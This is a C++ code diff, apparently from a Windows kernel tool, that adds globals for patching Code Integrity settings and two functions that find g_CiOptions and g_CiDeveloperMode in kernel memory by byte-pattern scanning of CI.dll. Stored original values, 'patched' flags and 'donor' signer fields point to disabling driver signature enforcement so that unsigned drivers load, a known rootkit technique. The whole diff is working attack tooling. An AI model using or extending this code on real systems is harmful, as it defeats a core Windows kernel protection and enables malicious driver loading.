@@ -22,9 +22,19 @@ PVOID g_OriginalCiCallback = nullptr;
 PVOID g_CiCallbackAddress = nullptr;
 bool g_CiCallbackPatched = false;
 
+PVOID g_CiOptionsAddress = nullptr;
+DWORD g_OriginalCiOptions = 0;
+bool g_CiOptionsPatched = false;
+
+PVOID g_CiDevModeAddress = nullptr;
+DWORD g_OriginalCiDevMode = 0;
+bool g_CiDevModePatched = false;
+
 bool g_KernelSigningVerified = false;
 DWORD g_PatchedFlags = 0;
 PVOID g_DriverLoadAddress = nullptr;
+WCHAR g_DonorCopyPath[520] = { 0 };
+WCHAR g_DonorSignerName[256] = { 0 };
 
 struct WindowsVersion {
     DWORD major;
@@ -451,6 +461,152 @@ namespace KernelUtils {
 
         printf("[-] Driver entry not found in PsLoadedModuleList\n");
         return FALSE;
+    }
+
+    BOOL GetCiOptionsAddress(PVOID* outAddress) {
+        PVOID ciBase = GetKernelModuleBase("CI.dll");
+        if (!ciBase) {
+            printf("[-] Failed to get CI.dll kernel base\n");
+            return FALSE;
+        }
+        printf("[+] CI.dll kernel base: %p\n", ciBase);
+
+        HMODULE localCi = LoadLibraryExW(L"CI.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
+        if (!localCi) {
+            printf("[-] Failed to load local CI.dll\n");
+            return FALSE;
+        }
+
+        MODULEINFO modinfo = { 0 };
+        if (!K32GetModuleInformation(GetCurrentProcess(), localCi, &modinfo, sizeof(modinfo))) {
+            FreeLibrary(localCi);
+            printf("[-] Failed to get CI.dll module info\n");
+            return FALSE;
+        }
+
+        BYTE* base = reinterpret_cast<BYTE*>(localCi);
+        PVOID optionsLocal = nullptr;
+
+        // Pattern from CiGetActionsForImage in CI.dll:
+        //   8B 05 ?? ?? ?? ??       mov  eax, cs:g_CiOptions
+        //   ... (within 20 bytes)
+        //   A8 08                   test al, 8
+        //   74 ??                   jz   short
+        //   F7 05 ?? ?? ?? ?? 00 04 00 00   test cs:g_CiTestFlags, 400h
+        for (DWORD i = 0; i + 30 < modinfo.SizeOfImage; i++) {
+            if (base[i] != 0x8B || base[i + 1] != 0x05) continue;
+
+            bool foundTest = false;
+            for (DWORD j = 6; j < 20 && (i + j + 1) < modinfo.SizeOfImage; j++) {
+                if (base[i + j] == 0xA8 && base[i + j + 1] == 0x08) {
+                    foundTest = true;
+                    break;
+                }
+            }
+            if (!foundTest) continue;
+
+            bool foundTestFlags = false;
+            for (DWORD j = 6; j < 30 && (i + j + 9) < modinfo.SizeOfImage; j++) {
+                if (base[i + j] == 0xF7 && base[i + j + 1] == 0x05 &&
+                    base[i + j + 6] == 0x00 && base[i + j + 7] == 0x04 &&
+                    base[i + j + 8] == 0x00 && base[i + j + 9] == 0x00) {
+                    foundTestFlags = true;
+                    break;
+                }
+            }
+            if (!foundTestFlags) continue;
+
+            INT32 ripOffset = *reinterpret_cast<INT32*>(&base[i + 2]);
+            BYTE* target = &base[i + 6] + ripOffset;
+
+            ULONG_PTR localOffset = reinterpret_cast<ULONG_PTR>(target) - reinterpret_cast<ULONG_PTR>(localCi);
+            if (localOffset < modinfo.SizeOfImage) {
+                optionsLocal = target;
+                printf("[+] g_CiOptions found at CI.dll+0x%llX\n", (unsigned long long)localOffset);
+                break;
+            }
+        }
+
+        if (!optionsLocal) {
+            FreeLibrary(localCi);
+            printf("[-] g_CiOptions pattern not found in CI.dll\n");
+            return FALSE;
+        }
+
+        ULONG_PTR offset = reinterpret_cast<ULONG_PTR>(optionsLocal) - reinterpret_cast<ULONG_PTR>(localCi);
+        FreeLibrary(localCi);
+
+        *outAddress = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ciBase) + offset);
+        printf("[+] g_CiOptions kernel address: %p\n", *outAddress);
+        return TRUE;
+    }
+
+    BOOL GetCiDeveloperModeAddress(PVOID* outAddress) {
+        PVOID ciBase = GetKernelModuleBase("CI.dll");
+        if (!ciBase) {
+            printf("[-] Failed to get CI.dll kernel base\n");
+            return FALSE;
+        }
+
+        HMODULE localCi = LoadLibraryExW(L"CI.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES);
+        if (!localCi) {
+            printf("[-] Failed to load local CI.dll\n");
+            return FALSE;
+        }
+
+        MODULEINFO modinfo = { 0 };
+        if (!K32GetModuleInformation(GetCurrentProcess(), localCi, &modinfo, sizeof(modinfo))) {
+            FreeLibrary(localCi);
+            return FALSE;
+        }
+
+        BYTE* base = reinterpret_cast<BYTE*>(localCi);
+        PVOID devModeLocal = nullptr;
+
+        // Pattern from CiGetActionsForImage referencing g_CiDeveloperMode+2:
+        // F6 05 ?? ?? ?? ?? 01    test byte ptr [rip+g_CiDeveloperMode+2], 1
+        // 74 ??                   jz short
+        // 48 8B 45 08             mov rax, [rbp+8]
+        // 83 CB 10                or  ebx, 10h
+        // F7 40 30 00 01 00 00    test dword ptr [rax+30h], 100h
+        for (DWORD i = 0; i + 23 < modinfo.SizeOfImage; i++) {
+            if (base[i] == 0xF6 && base[i + 1] == 0x05 &&
+                base[i + 6] == 0x01 &&
+                base[i + 7] == 0x74 &&
+                base[i + 9] == 0x48 && base[i + 10] == 0x8B &&
+                base[i + 11] == 0x45 && base[i + 12] == 0x08 &&
+                base[i + 13] == 0x83 && base[i + 14] == 0xCB &&
+                base[i + 15] == 0x10 &&
+                base[i + 16] == 0xF7 && base[i + 17] == 0x40 &&
+                base[i + 18] == 0x30 && base[i + 19] == 0x00 &&
+                base[i + 20] == 0x01 && base[i + 21] == 0x00 &&
+                base[i + 22] == 0x00) {
+
+                INT32 ripOffset = *reinterpret_cast<INT32*>(&base[i + 2]);
+                BYTE* target = &base[i + 7] + ripOffset;
+                target -= 2; // rip+offset points to g_CiDeveloperMode+2, subtract 2
+
+                ULONG_PTR localOffset = reinterpret_cast<ULONG_PTR>(target) - reinterpret_cast<ULONG_PTR>(localCi);
+                if (localOffset < modinfo.SizeOfImage) {
+                    devModeLocal = target;
+                    printf("[+] g_CiDeveloperMode found at CI.dll+0x%llX\n", (unsigned long long)localOffset);
+                    break;
+                }
+            }
+        }
+
+        if (!devModeLocal) {
+            FreeLibrary(localCi);
+            printf("[-] g_CiDeveloperMode pattern not found in CI.dll\n");
+            return FALSE;
+        }
+
+        ULONG_PTR offset = reinterpret_cast<ULONG_PTR>(devModeLocal) - reinterpret_cast<ULONG_PTR>(localCi);
+        FreeLibrary(localCi);
+
+        *outAddress = reinterpret_cast<PVOID>(reinterpret_cast<ULONG_PTR>(ciBase) + offset);
+        printf("[+] g_CiDeveloperMode kernel address: %p\n", *outAddress);
+        return TRUE;
     }
 
 }
